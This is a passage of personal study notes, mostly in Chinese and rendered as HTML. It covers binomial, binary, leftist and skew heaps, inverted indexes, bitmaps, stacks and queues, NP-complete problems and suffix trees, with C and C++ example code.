		else if (it3!=_heap.end() &amp;&amp;
				(*it1)-&gt;degree == (*it2)-&gt;degree &amp;&amp;
				(*it1)-&gt;degree == (*it3)-&gt;degree)
		{
			it1++;
			it2++;
			it3++;
		}

		// if degree of two Binomial Tree are same in heap
		else if ((*it1)-&gt;degree == (*it2)-&gt;degree)
		{
			Node *temp;
			*it1 = mergeBinomialTrees(*it1,*it2);
			it2 = _heap.erase(it2);
			if(it3 != _heap.end())
				it3++;
		}
	}
	return _heap;
}
</code></pre>
<pre><code class="language-cpp">// C++ program to implement different operations
// on Binomial Heap
#include&lt;bits/stdc++.h&gt;
using namespace std;

// A Binomial Tree node.
struct Node
{
	int data, degree;
	Node *child, *sibling, *parent;
};

Node* newNode(int key)
{
	Node *temp = new Node;
	temp-&gt;data = key;
	temp-&gt;degree = 0;
	temp-&gt;child = temp-&gt;parent = temp-&gt;sibling = NULL;
	return temp;
}

// This function merge two Binomial Trees.
Node* mergeBinomialTrees(Node *b1, Node *b2)
{
	// Make sure b1 is smaller
	if (b1-&gt;data &gt; b2-&gt;data)
		swap(b1, b2);

	// We basically make larger valued tree
	// a child of smaller valued tree
	b2-&gt;parent = b1;
	b2-&gt;sibling = b1-&gt;child;
	b1-&gt;child = b2;
	b1-&gt;degree++;

	return b1;
}

// adjust function rearranges the heap so that
// heap is in increasing order of degree and
// no two binomial trees have same degree in this heap


// inserting a Binomial Tree into binomial heap
list&lt;Node*&gt; insertATreeInHeap(list&lt;Node*&gt; _heap,
							Node *tree)
{
	// creating a new heap i.e temp
	list&lt;Node*&gt; temp;

	// inserting Binomial Tree into heap
	temp.push_back(tree);

	// perform union operation to finally insert
	// Binomial Tree in original heap
	temp = unionBionomialHeap(_heap,temp);

	return adjust(temp);
}

// removing minimum key element from binomial heap
// this function take Binomial Tree as input and return
// binomial heap after
// removing head of that tree i.e. minimum element
list&lt;Node*&gt; removeMinFromTreeReturnBHeap(Node *tree)
{
	list&lt;Node*&gt; heap;
	Node *temp = tree-&gt;child;
	Node *lo;

	// making a binomial heap from Binomial Tree
	while (temp)
	{
		lo = temp;
		temp = temp-&gt;sibling;
		lo-&gt;sibling = NULL;
		heap.push_front(lo);
	}
	return heap;
}

// inserting a key into the binomial heap
list&lt;Node*&gt; insert(list&lt;Node*&gt; _head, int key)
{
	Node *temp = newNode(key);
	return insertATreeInHeap(_head,temp);
}

// return pointer of minimum value Node
// present in the binomial heap
Node* getMin(list&lt;Node*&gt; _heap)
{
	list&lt;Node*&gt;::iterator it = _heap.begin();
	Node *temp = *it;
	while (it != _heap.end())
	{
		if ((*it)-&gt;data &lt; temp-&gt;data)
			temp = *it;
		it++;
	}
	return temp;
}

list&lt;Node*&gt; extractMin(list&lt;Node*&gt; _heap)
{
	list&lt;Node*&gt; new_heap,lo;
	Node *temp;

	// temp contains the pointer of minimum value
	// element in heap
	temp = getMin(_heap);
	list&lt;Node*&gt;::iterator it;
	it = _heap.begin();
	while (it != _heap.end())
	{
		if (*it != temp)
		{
			// inserting all Binomial Tree into new
			// binomial heap except the Binomial Tree
			// contains minimum element
			new_heap.push_back(*it);
		}
		it++;
	}
	lo = removeMinFromTreeReturnBHeap(temp);
	new_heap = unionBionomialHeap(new_heap,lo);
	new_heap = adjust(new_heap);
	return new_heap;
}

// print function for Binomial Tree
void printTree(Node *h)
{
	while (h)
	{
		cout &lt;&lt; h-&gt;data &lt;&lt; &quot; &quot;;
		printTree(h-&gt;child);
		h = h-&gt;sibling;
	}
}

// print function for binomial heap
void printHeap(list&lt;Node*&gt; _heap)
{
	list&lt;Node*&gt; ::iterator it;
	it = _heap.begin();
	while (it != _heap.end())
	{
		printTree(*it);
		it++;
	}
}


// Driver program to test above functions
int main()
{
	int ch,key;
	list&lt;Node*&gt; _heap;

	// Insert data in the heap
	_heap = insert(_heap,10);
	_heap = insert(_heap,20);
	_heap = insert(_heap,30);

	cout &lt;&lt; &quot;Heap elements after insertion:\n&quot;;
	printHeap(_heap);

	Node *temp = getMin(_heap);
	cout &lt;&lt; &quot;\nMinimum element of heap &quot;
		&lt;&lt; temp-&gt;data &lt;&lt; &quot;\n&quot;;

	// Delete minimum element of heap
	_heap = extractMin(_heap);
	cout &lt;&lt; &quot;Heap after deletion of minimum element\n&quot;;
	printHeap(_heap);

	return 0;
}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="ds-heap"><a class="header" href="#ds-heap">DS-Heap</a></h1>
<h2 id="二叉堆"><a class="header" href="#二叉堆">二叉堆</a></h2>
<p>参考链接：<a href="https://www.jianshu.com/p/6b526aa481b1">简书-堆</a></p>
<p>堆是一种特殊的树，二叉堆就是用数组实现的二叉树。</p>
<p>堆分为两种：<strong>最大堆max-heap</strong>和<strong>最小堆min-heap</strong>，两者的差别在于节点的排序方式。在最大堆中，父节点的值比每一个子节点的值都要大。在最小堆中，父节点的值比每一个子节点的值都要小。这就是所谓的“堆属性”，并且这个属性对堆中的每一个节点都成立。我们下面主要提到的堆指二叉堆。</p>
<p>你可以发现相比于二叉树，堆的“有序性”降低了。因此堆的主要目的不是用于搜索，而是快速的对最大或最小元素进行删除或插入操作。并且最小堆和最大堆没有必要是二叉堆。</p>
<h3 id="index第一个元素的index0"><a class="header" href="#index第一个元素的index0">index(第一个元素的index=0)</a></h3>
<p><code>parent = (int)((i-1)/2)</code>这里加个int主要是强调一下取整。。
<code>lson = i*2+1;	rson = i*2+2</code>
千万不要直接复制下面的代码，因为这不是我一次写的。有的地方index=0有点地方index=1，有时候我直接用一个数组，有时候定义了一个完整的结构。</p>
<h2 id="优先队列-priority-queue"><a class="header" href="#优先队列-priority-queue">优先队列 Priority Queue</a></h2>
<p>Abstract Data Type优先队列的定义如下：</p>
<pre><code class="language-c">//ADT priority queue
typedef struct HeapStruct* PriorityQueue;
struct HeapStruct{
    int Capacity;
    int Size;
    Elementtype *Elements;	//一般用数组
}

void Insert(Elementtype X,PriorityQueue H);
Elementtype DeleteMin(PriorityQueue H);
Elementtype FindMin(PriorityQueue H);
PriorityQueue BuildHeap(Array a);
</code></pre>
<p>二叉堆是实现ADT优先队列的一个高效方法	，优先队列在底层一般使用二叉堆（<strong>Binary Heap</strong>）实现。优先队列有两个最基本的操作，Insert和ReturnMin。下面的操作是第一个元素的index = 1;</p>
<pre><code class="language-c">//Insert 很简单，插入的元素和父节点比较，如果小就交换，知道达到根节点或父节点小为之。时间复杂度是O(log(n))，其实就是PercolateUp的过程。
void Insert(Elementtype X,PriorityQueue H){
    int i;
    if (IsFull(H))
    {
        Error(&quot;Priority is full&quot;); return;
    }
    for (i=++H-&gt;size; H-&gt;Elements[i/2]&gt;X,i/=2)
    	H-&gt;Elements[i] = H-&gt;Elements[i/2];
    H-&gt;Elements[i]=X;
}
</code></pre>
<pre><code class="language-c">//DeleteMin 其实是最后一个先提升到root，在沉到下面把最小的换上去。时间复杂度也是O(log(n))
ElementType  DeleteMin( PriorityQueue  H ) { 
    int  i, Child; 
 	ElementType  MinElement, LastElement; 
    if ( IsEmpty( H ) ) { 
        Error( &quot;Priority queue is empty&quot; ); return  H-&gt;Elements[ 0 ];   
    } 
    MinElement = H-&gt;Elements[ 1 ];  /* save the min element */
    LastElement = H-&gt;Elements[ H-&gt;Size-- ];  /* take last and reset size */
    for ( i = 1; i * 2 &lt;= H-&gt;Size; i = Child ) {  /* Find smaller child */
		Child = i * 2; 
        if (Child != H-&gt;Size &amp;&amp; H-&gt;Elements[Child+1] &lt; H-&gt;Elements[Child]) 
            Child++; 
        if ( LastElement &gt; H-&gt;Elements[ Child ] )   /* Percolate one level */
			H-&gt;Elements[ i ] = H-&gt;Elements[ Child ]; 
      	else     
          	break;   /* find the proper position */
    } 
    H-&gt;Elements[ i ] = MinElement; 
    return  MinElement; 
}
</code></pre>
<pre><code class="language-c">PriorityQueue  BuildHeap( int  MaxElements ) 
{ 
    PriorityQueue  H; 
    if ( MaxElements &lt; MinPQSize ) 
        return  Error( &quot;Priority queue size is too small&quot; ); 
    H = malloc( sizeof ( struct HeapStruct ) ); 
    if ( H ==NULL ) 
        return  FatalError( &quot;Out of space!!!&quot; ); 
    /* Allocate the array plus one extra for sentinel */ 
    H-&gt;Elements = malloc(( MaxElements + 1 ) * sizeof( ElementType )); 
    if ( H-&gt;Elements == NULL ) 
        return  FatalError( &quot;Out of space!!!&quot; ); 
    H-&gt;Capacity = MaxElements; 
    H-&gt;Size = 0; 
    H-&gt;Elements[ 0 ] = MinData;  /* set the sentinel */
    return  H; 
}

</code></pre>
<h2 id="其他的操作"><a class="header" href="#其他的操作">其他的操作</a></h2>
<p>PercolateDown就是和自己的两个儿子比，把三个数中最小的换成父亲，然后一直从root到n。(我这里是第一个节点index==0的写法)</p>
<pre><code class="language-c">void PercDown(int *heap, int root ,int n)
{
    int Child,i,r; 
    r = heap[root];
    for (i = root; i*2+1 &lt;= n; i = Child ) { 
        //选出最小的Child 
		Child = i*2+1; 
        if (Child != n &amp;&amp; heap[Child+1] &gt;  heap[Child]) 
            Child++; 
        if ( heap[i] &lt; heap[Child] )   /* Percolate one level */
			swap(heap+i,heap+Child);
      	else     
          	break;   /* find the proper position */
    } 
    heap[i] = r;    
}
</code></pre>
<p>那么Initialize的另一个写法是：For binary heaps with <em>N</em> elements, the <em>BuildHeap</em> function (which adjust an array of elements into a heap in linear time) does at most 2<em>N</em>−2 comparisons between elements.</p>
<pre><code class="language-c">for (i=N/2; i&gt;0; i--)
    PercolateDown(heap-&gt;Element, i, heap-&gt;size-1);
</code></pre>
<p>DeleteMin的另一个写法是：</p>
<pre><code class="language-c">Elementtype DeleteMin(heap)
{
    swap(&amp;heap-&gt;Elements[0] ,&amp;heap-&gt;Element[--heap-&gt;size]);  //交换第一个和最后一个元素，并把size-1
    PercolateDown(heap-&gt;Elements, 0, heap-&gt;size-1);    //在新的size范围内把index=0沉底
    return heap-&gt;Elements[heap-&gt;size];   //返回之前移到最后的元素
}
​```c
void Insert(heap, Elementtype v)
{
    heap-&gt;Elements[heap-&gt;size++] = v;
    PercolateUp();
} 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="leftist_heap_and_skew_heap"><a class="header" href="#leftist_heap_and_skew_heap">Leftist_Heap_and_Skew_Heap</a></h1>
<p>堆，每次都要返回highest level值。比如最大值和最小值。</p>
<h2 id="leftist-heap"><a class="header" href="#leftist-heap">Leftist Heap</a></h2>
<p>目的是加速堆的合并。 </p>
<p>我们规定Null path length：Npl(NULL)=-1，Npl(X) = Min(Npl(Child)+1 | for all child of X )。
Leftist Heap的定义：满足Npl(left child)$\geq$ Npl(right child)。（一个左倾的二叉树）。</p>
<p>比如下面这个图，我们首先标记没有两个孩子的节点的Npl=0，然后向上标记。最后检查是否所有节点的Npl(left child)$\geq$ Npl(right child)。</p>
<p><img src="Basic/DataStructure/Heap/../images/leftist_tree.jpg" alt="img" /></p>
<blockquote>
<p>Any a consecutive operations take at most O(log N) time.</p>
</blockquote>
<h3 id="复杂度分析-2"><a class="header" href="#复杂度分析-2">复杂度分析</a></h3>
<pre><code>   Function       Complexity(worst)		Comparison
1) Get Min:       O(1)      			[same as both Binary and Binomial]
2) Delete Min:    O(Log n)  			[same as both Binary and Binomial]
3) Insert:        O(Log n)  			我看网上的说法是，如果是数组实现的话是O(M+N)如果是树实现的话也可以是O(Log n)
4) Merge:         O(Log n)  			[O(Log n) in Binomial]
</code></pre>
<h3 id="merge"><a class="header" href="#merge">Merge</a></h3>
<p>DeleteMin可以变成把root去除之后再merge左右分支；Insert可以是merge原来的堆和一个single key的堆。所以关键是merge操作。</p>
<p>递归版本：</p>
<pre><code class="language-c">PriorityQueue  Merge ( PriorityQueue H1, PriorityQueue H2 )
{ 
	if ( H1 == NULL )   return H2;	
	if ( H2 == NULL )   return H1;	
	if ( H1-&gt;Element &lt; H2-&gt;Element )  return Merge1( H1, H2 );
	else return Merge1( H2, H1 );
}
static PriorityQueue
Merge1( PriorityQueue H1, PriorityQueue H2 )
{ 
	if ( H1-&gt;Left == NULL ) 	/* single node */
		H1-&gt;Left = H2;	/* H1-&gt;Right is already NULL 
				    and H1-&gt;Npl is already 0 */
	else {
		H1-&gt;Right = Merge( H1-&gt;Right, H2 );     /* Step 1 &amp; 2 */
		if ( H1-&gt;Left-&gt;Npl &lt; H1-&gt;Right-&gt;Npl )
			SwapChildren( H1 );	/* Step 3 */
		H1-&gt;Npl = H1-&gt;Right-&gt;Npl + 1;
	} /* end else */
	return H1;
}
</code></pre>
<p>迭代版本：类似的，插入也是Merge。这里的necessary是什么意思？就是比较左右的Npl把大的放在左边。显然的，我们这一趟下来代价是$O(LogN)$
<img src="Basic/DataStructure/Heap/../images/1616461008585.jpg" alt="" /></p>
<h2 id="skew-heap"><a class="header" href="#skew-heap">Skew Heap</a></h2>
<p>Leftist Heap的简化版本。但是据说不好用。实际上合并堆这个需求本身就比较少。</p>
<blockquote>
<p>Any M consecutive operations take at most O(M log N) time.
或者说，一次Merge的摊还时间为O(N)</p>
</blockquote>
<h3 id="merge-1"><a class="header" href="#merge-1">Merge</a></h3>
<p>Merge: <strong>Always swap the left and right children</strong> except that the largest of all the nodes on the right paths does not have its children swapped.  No Npl.</p>
<p><img src="Basic/DataStructure/Heap/../images/1616461959547.jpg" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="inverted_file_index"><a class="header" href="#inverted_file_index">Inverted_File_Index</a></h1>
<p>搜索引擎的一些相关技术（请参考陈越的PPT）：</p>
<h2 id="inverted-file-index"><a class="header" href="#inverted-file-index">Inverted File Index</a></h2>
<p><a href="https://blog.csdn.net/hackerose1994/article/details/50933396">Inverted File Index</a>：一个典型的倒排索引主要由词汇表（也叫索引项）和事件表（也叫文件链表）两部分组成。
<img src="Basic/DataStructure/../images/20160319220240827" alt="CSDN外链" />
倒排索引(Inverted Index)：倒排索引是实现“单词-文档矩阵”的一种具体存储形式，通过倒排索引，可以根据单词快速获取包含这个单词的文档列表。倒排索引主要由两个部分组成：“单词词典”和“倒排文件”。</p>
<ul>
<li>单词词典：搜索引擎的通常索引单位是单词，单词词典是由文档集合中出现过的所有单词构成的字符串集合，单词词典内每条索引项记载单词本身的一些信息以及指向“倒排列表”的指针。</li>
<li>倒排列表(PostingList)：倒排列表记载了出现过某个单词的所有文档的文档列表及单词在该文档中出现的位置信息，每条记录称为一个倒排项(Posting)。根据倒排列表，即可获知哪些文档包含某个单词。</li>
</ul>
<h2 id="index-generator"><a class="header" href="#index-generator">Index Generator</a></h2>
<p>我们需要把一篇文章转换成一个倒排文件索引。</p>
<pre><code class="language-c">while ( read a document D ) {
    while ( read a term T in D ) {
        if ( Find( Dictionary, T ) == false )
            Insert( Dictionary, T );
        Get T’s posting list;
        Insert a node to T’s posting list;
    }
}
Write the inverted index to disk;	
</code></pre>
<p>While reading a term：</p>
<ul>
<li>Word Stemming ：当你读一个单词的时候，你要把他转换成普通形式。比如flies = fly。</li>
<li>Stop Words：比如the可以适当的忽略。</li>
</ul>
<p>While accessing a term：
Search trees ( B- trees, B+ trees, Tries, ... )：适合范围查找
Hashing：快，但是无法范围查找</p>
<p>Term-partitioned index：
Document-partitioned index：</p>
<p>Dynamic indexing：不一定要把所有的index存在一起，把新爬到的index放在一个小集合里，优先搜索他。
<img src="Basic/DataStructure/../images/20160319222643359" alt="" /></p>
<p>Thresholding：不需要把所有的关键字拿去搜索（低频搜索关键字更值得注意），不需要返回所有的结果（选取部分documents）。</p>
<h2 id="评价标准"><a class="header" href="#评价标准">评价标准</a></h2>
<p>Precision（得到的数据的准确） 和 Recall（得到的数据是否包含多数结果） 。</p>
<p><img src="Basic/DataStructure/../images/image-20210509100757748.png" alt="image-20210509100757748" /></p>
<ul>
<li>Data Retrieval Performance Evaluation (after establishing correctness)</li>
</ul>
<p>Response time
Index space</p>
<ul>
<li>Information Retrieval Performance Evaluation</li>
</ul>
<ul>
<li>How relevant is the answer set?</li>
</ul>
<h2 id="distributed-indexing"><a class="header" href="#distributed-indexing">Distributed indexing</a></h2>
<p><img src="Basic/DataStructure/../images/image-20210707225042535.png" alt="image-20210707225042535" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linear"><a class="header" href="#linear">Linear</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ds-bitmap"><a class="header" href="#ds-bitmap">DS-Bitmap</a></h1>
<p>参考链接：
<a href="https://zhuanlan.zhihu.com/p/54783053?utm_source=wechat_timeline">漫画：什么是bitmap算法</a></p>
<h2 id="简单的实现---c语言位运算的实践"><a class="header" href="#简单的实现---c语言位运算的实践">简单的实现 - C语言位运算的实践</a></h2>
<p>首先，一个二进制数字的一位有两种情况：1/0。
我们有N个对象，每个对象对于属性ATTR_A有两种可能：有/没有。
那么我们可以用一个N bit的数来存储（bitmap），每个对象对应于bitmap中的一位，用1和0来表示有和无。</p>
<p>举一个简单的例子，我们的PID有64种情况（0～63）。我们用一个bitmap来存储PID的使用情况：</p>
<ul>
<li><code>uint64 pid_bitmap;</code>
如果我们将PID=4分配出去，那么我们需要把pid_bitmap的第4位标记为1：</li>
<li><code>pid_bitmap |= 0x1&lt;&lt;PID;</code>
如果我们将PID=4回收，那么我们需要把pid_bitmap的第4位标记为0：</li>
<li><code>pid_bitmap &amp;= ~(0x1&lt;&lt;PID) </code>
查看PID=4的状态：</li>
<li><code>return pid_bitmap &amp; (0x1&lt;&lt;PID)</code>
从最低位开始查找第一个为0的位：</li>
<li><code>for (mask=1,PID=0; pid_bitmap &amp; mask; mask&lt;&lt;1,PID++);</code></li>
</ul>
<p>可以 看到我这个算法很明显的局限性。</p>
<ol>
<li>位数不能太大。</li>
<li>只能有两个状态。</li>
</ol>
<p>关于解决办法</p>
<ol>
<li>自己用数组实现一下</li>
<li>把状态细分成只有两个状态，比如有4种可能的ATTR_B可以用两个bitmap实现。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ds-linear_list"><a class="header" href="#ds-linear_list">DS-Linear_List</a></h1>
<p><strong>数组</strong>是最基本的线性表，可以随机查询。
<strong>链表list</strong>包括了指针指向其他节点，好处是大小动态变化，以及删除插入代价小。</p>
<p>|        | 链表Linked list | 数组Sequential list                      |
|  | - |
| Find   | O(N)            | 如果是无序的是O(N)，有序的用二分O(log N) |
| Insert | O(1)            | O(N)                                     |
| Delete | O(1)            | O(N)                                     |
| Query  | O(N)            | O(1)                                     |</p>
<p>进一步，可以由这两个得到<strong>堆栈stack</strong>和<strong>队列queue</strong>。</p>
<h2 id="链表-1"><a class="header" href="#链表-1">链表</a></h2>
<p>链表不好之处在于不支持随机查找。
双向链表。
头结点可以让链表操作变得统一。</p>
<h2 id="堆栈"><a class="header" href="#堆栈">堆栈</a></h2>
<p>两种实现方法（数组和链表）</p>
<pre><code>//数组
struct stack{
    ElementType value[N];
    int sp;
};
</code></pre>
<p>链表实现就来个头结点就好了。没什么特殊的。
pop和push。溢出的问题，看情况。</p>
<h3 id="表达式"><a class="header" href="#表达式">表达式</a></h3>
<p>我们可以用逆波兰法来完成<strong>infix expression到postfix expression</strong>到转换。
&gt;（1）若取出的字符是操作数，则分析出完整的运算数，该操作数直接输出。
&gt;（2）若取出的字符是运算符，则将该运算符与S1栈栈顶元素比较，如果<strong>该运算符(不包括括号运算符)优先级高于S1栈栈顶运算符</strong>（包括左括号）优先级，则将该运算符进S1栈，否则，将S1栈的栈顶运算符弹出输出，直至S1栈栈顶运算符（包括左括号）低于（不包括等于）该运算符优先级时停止弹出运算符，最后将该运算符送入S1栈。
&gt;（3）若取出的字符是“（”，则直接送入S1栈顶。
&gt;（4）若取出的字符是“）”，则将距离S1栈栈顶最近的“（”之间的运算符，逐个出栈，依次输出，此时抛弃“（”。
&gt;（5）重复上面的1~4步，直至处理完所有的输入字符。</p>
<h2 id="队列-1"><a class="header" href="#队列-1">队列</a></h2>
<p>两种实现方法（数组和链表）</p>
<pre><code>//数组
struct stack{
    int head;
    int tail;
    ElementType value[N];
};
</code></pre>
<p>enqueue和dequeue，注意取模。溢出的问题，看情况。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ds-np_problem"><a class="header" href="#ds-np_problem">DS-NP_problem</a></h1>
<h2 id="np问题"><a class="header" href="#np问题">NP问题</a></h2>
<p>四个概念：</p>
<ul>
<li>P：存在多项式时间算法的问题。(P：polynominal，多项式)。</li>
<li>NP：能在多项式时间内<strong>验证得出一个正确解</strong>的问题。(NP:Nondeterministic polynominal，非确定性多项式)。这里可以清楚的看出P类问题是NP类问题的子集（即存在多项式时间算法的问题，总能在多项式时间内验证它）。但是我们<strong>不知道这个问题存不存在一个多项式时间的算法non-deterministic</strong>（是不知道而不是不存在）。</li>
<li>NPC：NP complete NP完全。<strong>所有的NP问题都可以约化成它的NP问题</strong>。要证明npc问题的思路就是： 先证明它至少是一个NP问题，再证明其中一个已知的NPC问题能约化到它。</li>
<li>NP Hard：即所有的NP问题都能约化到它，但是它<strong>不一定是一个NP问题</strong>。</li>
</ul>
<p>然后$P=NP$是否成立在现在还没有定论，大部分人认为是不等的。如果等的话那很多问题都可以很方便的解决了。</p>
<p><img src="https://pic2.zhimg.com/v2-1a4f4cfd668c28c1b47c266c7fe85199_b.jpg" alt="" /></p>
<p><strong>决定性问题</strong>(Decision problem)是一个在某些<a href="https://baike.baidu.com/item/%E5%BD%A2%E5%BC%8F%E7%B3%BB%E7%BB%9F/1534121">形式系统</a>回答<strong>是或否</strong>的问题。比如我们验证一条路是否是Hamiltonian Path是一个决定性问题，并且我们只需要多项式时间就可以解决。<strong>停机问题halting problem</strong>是undecidable decision problem。</p>
<p>已知的NPC问题：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Boolean_satisfiability_problem">Boolean satisfiability problem (SAT) </a> </li>
<li><a href="https://en.wikipedia.org/wiki/Knapsack_problem">Knapsack problem</a></li>
<li><a href="https://en.wikipedia.org/wiki/Hamiltonian_path_problem">Hamiltonian path problem</a></li>
<li><a href="https://en.wikipedia.org/wiki/Travelling_salesman_problem">Travelling salesman problem</a> (decision version)</li>
<li><a href="https://en.wikipedia.org/wiki/Subgraph_isomorphism_problem">Subgraph isomorphism problem</a></li>
<li><a href="https://en.wikipedia.org/wiki/Subset_sum_problem">Subset sum problem</a></li>
<li><a href="https://en.wikipedia.org/wiki/Clique_problem">Clique problem</a></li>
<li><a href="https://en.wikipedia.org/wiki/Vertex_cover_problem">Vertex cover problem</a></li>
<li><a href="https://en.wikipedia.org/wiki/Independent_set_problem">Independent set problem</a></li>
<li><a href="https://en.wikipedia.org/wiki/Dominating_set_problem">Dominating set problem</a></li>
<li><a href="https://en.wikipedia.org/wiki/Graph_coloring_problem">Graph coloring problem</a></li>
</ul>
<h2 id="常见npc问题简介"><a class="header" href="#常见npc问题简介">常见NPC问题简介</a></h2>
<p>我们后面介绍的 <strong>贪心算法，局部搜索，随机化算法</strong> 在很大程度上都是为了解决NPC问题，或者说求出一个较好的近似解。所以我们介绍一下常见的NPC问题和一些求近似解的方法。</p>
<h3 id="max-cut-problem"><a class="header" href="#max-cut-problem">Max cut problem</a></h3>
<blockquote>
<p>最大割问题是 NPC 问题。给定一张图，求一种分割方法，将所有顶点分割成两群，同时使得被切断的边数量最大。 </p>
<p>此问题还有另一个变形的版本：每条边上有各自的权重，要使得被切断的边的权重之和最大。</p>
</blockquote>
<p>解法在<a href="Basic/DataStructure/(/post/ads-local-search/)">Local search</a>中介绍。2-approximation。</p>
<h3 id="vertex-cover-problem-1"><a class="header" href="#vertex-cover-problem-1">Vertex cover problem</a></h3>
<blockquote>
<p>对于图$G=(V,E)$，找到一个点集$V'$使得$E$中所有的edge至少有一个端点在$V'$中。这是一个NPC问题。</p>
</blockquote>
<p>在<a href="Basic/DataStructure//post/ads-local-search/">Local search</a>中介绍了一个解法，可以找到局部的最优解，但不一定是全局的最优解。</p>
<p>在<a href="Basic/DataStructure//post/ads-approximation-algorithm/">Approximation</a>中介绍了一个2-approximation的近似解法。</p>
<h3 id="knapsack-problem-1"><a class="header" href="#knapsack-problem-1">Knapsack problem</a></h3>
<h3 id="clique-problem"><a class="header" href="#clique-problem">clique problem</a></h3>
<blockquote>
<p>分团问题。the clique problem is the computational problem of finding cliques (subsets of vertices, all adjacent to each other, also called complete subgraphs) in a graph.我们在提到这个问题的时候，一般指的是是找最大的clique；有时候是找固定大小的clique。</p>
</blockquote>
<p>for every real number ε &gt; 0, there can be no polynomial time algorithm that approximates the maximum clique to within a factor better than $O(n^{1 − \epsilon})$, unless P = NP.</p>
<h3 id="sat-problem"><a class="header" href="#sat-problem">SAT problem</a></h3>
<blockquote>
<p>布尔可满足性问题（有时称为命题可满足性问题，缩写为SATISFIABILITY或SAT）。布尔可满足性问题（<strong>Boolean satisfiability problem</strong>；<strong>SAT</strong> ）属于<a href="https://zh.wikipedia.org/wiki/%E6%B1%BA%E5%AE%9A%E6%80%A7%E5%95%8F%E9%A1%8C">决定性问题</a>，也是第一个被证明属于<a href="https://zh.wikipedia.org/wiki/NP%E5%AE%8C%E5%85%A8">NP完全</a>的问题。</p>
</blockquote>
<blockquote>
<p>与任意公式的可满足性问题一样，确定公式的可满足性，其中每个条款限制为最多三个文字的连续正规形式。这个问题被称为3-SAT。他也是NPC问题。举个例子$(x ∨ x ∨ y) ∧ (¬x ∨ ¬y ∨ ¬y) ∧ (¬x ∨ y ∨ y)$，当$x=0,y=1$的时候就满足了。</p>
</blockquote>
<p>一个Schöning提出的<strong>randomized algorithm</strong> 可以近似解决，下面是定一个简化的办法。以1/2的概率随机给每个变量分配1或0。那么这样子的话，每个clause=1的概率是$\frac {7} {8}$，对于一共K个clause，会有期望$E=\frac {7K} {8}$个clause为1。我们要做的就是检查我们的分配是否可以让超过$\frac {7K} {8}$个clause为1，如果不行的化就再随机一次。</p>
<p>然后这个随机化算法，一次分配超过$\frac {7K} {8}$个clause为1的概率至少是$\frac {1}{8k}$。</p>
<p><img src="Basic/DataStructure/../images/v2-f0ab095b4b48005f166fadf88a2de2b7_r.jpg" alt="preview" /></p>
<h3 id="bin-packing-problem"><a class="header" href="#bin-packing-problem">Bin packing problem</a></h3>
<blockquote>
<p>Given N items of sizes S1 , S2 , …, SN , such that 0 &lt; Si ≤ 1 for all 1 ≤ i ≤ N . Pack these items in the fewest number of bins, each of which has unit capacity.</p>
</blockquote>
<p>在<a href="Basic/DataStructure//post/ads-approximation-algorithm/">Approximation</a>中介绍了几种办法和能达到的近似程度。</p>
<p><strong>Next Fit</strong> is a 2-approximation for Bin Packing. The algorithm runs in O (n) time.</p>
<p><strong>First Fit</strong> uses at most k ≤ ⌈17/10·k'⌉ many bins, where k' is the optimal number.</p>
<p><strong>First Fit Decreasing(Best Fit)</strong> is a 3/2-approximation for Bin Packing. The algorithm runs in O(n^2)O(n2) time.</p>
<p>There is no ρ-approximation algorithm with ρ &lt; 3/2 for Bin Packing unless P = NP.</p>
<h3 id="degree-spanning-tree-problem"><a class="header" href="#degree-spanning-tree-problem">Degree Spanning Tree problem</a></h3>
<p>一般的最小生成树不是NPC问题。但是挺常考的。</p>
<pre><code> 从一个解T开始
 for (图中的每条边e）
     if(加入e不构成环，则T=T+e）
     else e'是环上权重最大的边，T=T+e-e‘
</code></pre>
<p>局部搜索也可以找到最小生成树。对于一个最小生成树T，如果我们任意的连接两个点，得到的连线肯定是环中最大的，不然交换之后就可以得到更好的解。</p>
<p>最小度生成树是NPC问题。</p>
<ul>
<li>travelling sales man </li>
<li>Euler circuit problem: Find a path that touches every edge exactly once.</li>
<li>Hamilton cycle problem: Find a single cycle that contains every vertex.</li>
<li>Single-source unweighted longest-path problem</li>
<li>Single-source unweighted shortest-path problem</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="字符串匹配相关算法"><a class="header" href="#字符串匹配相关算法">字符串匹配相关算法</a></h1>
<hr />
<h2 id="pat-tree后缀树"><a class="header" href="#pat-tree后缀树">PAT Tree后缀树</a></h2>
<p>他和字典树（前缀树）的概念挺像的。比如下面是BANANA的后缀树。其实也可以认为是</p>
<ul>
<li>BANANA$</li>
<li>ANANA$</li>
<li>NANA$</li>
<li>ANA$</li>
<li>NA$</li>
<li>A$</li>
</ul>
<p>构成的字典树，并且经过了压缩。你可以用O(n)的算法构造他。</p>
<p><img src="Basic/DataStructure/String/../images/250px-Suffix_tree_BANANA.svg.png" alt="250px-Suffix_tree_BANANA.svg" /></p>
<p>他可以用来解决很多的字符串相关问题，参考<a href="https://blog.csdn.net/fanzitao/article/details/8042015">https://blog.csdn.net/fanzitao/article/details/8042015</a></p>
<ol>
<li>在文本T里查询T是否包含子串P（复杂度同KMP相当）。</li>
<li>文本T里找出最长重复子串。比如abcdabcefda里abc同da都重复出现，而最长重复子串是abc。</li>
<li>找出字符串S1同S2的最长公共子串。</li>
<li>Ziv-Lampel无损压缩算法。</li>
</ol>
<h2 id="后缀自动机-sam"><a class="header" href="#后缀自动机-sam">后缀自动机 SAM</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="字符串匹配算法"><a class="header" href="#字符串匹配算法">字符串匹配算法</a></h1>
<p>字符串匹配又称模式匹配（pattern matching）。该问题可以概括为“给定字符串S和T，在主串S中寻找子串T。字符T称为模式串 (pattern)。我是一个算法小白，这里介绍的大多数算法我都只是做一个了解。如果后续有机会的话好好研究。</p>
<h2 id="1模式串-1字符串"><a class="header" href="#1模式串-1字符串">1模式串-1字符串</a></h2>
<p>我们要解决的问题就是：给定字符串S和T，在主串S中寻找子串T。也就是一个标准的字符串匹配工作，也就是很多语言都有的<code>str.find()</code>函数（或类似的函数）。</p>
